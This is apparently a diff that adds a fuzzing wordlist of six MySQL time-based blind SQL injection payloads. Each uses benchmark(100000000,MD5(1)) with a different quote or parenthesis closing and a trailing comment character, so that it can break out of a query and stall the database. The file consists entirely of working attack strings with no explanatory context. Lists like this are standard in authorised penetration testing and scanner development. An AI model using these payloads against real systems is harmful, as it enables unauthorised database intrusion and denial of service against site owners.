@@ -1,0 +1,6 @@
+1 or benchmark(100000000,MD5(1))#
+1' or benchmark(100000000,MD5(1))#
+1) or benchmark(100000000,MD5(1))#
+1') or benchmark(100000000,MD5(1))#
+1)) or benchmark(100000000,MD5(1))#
+1')) or benchmark(100000000,MD5(1))#
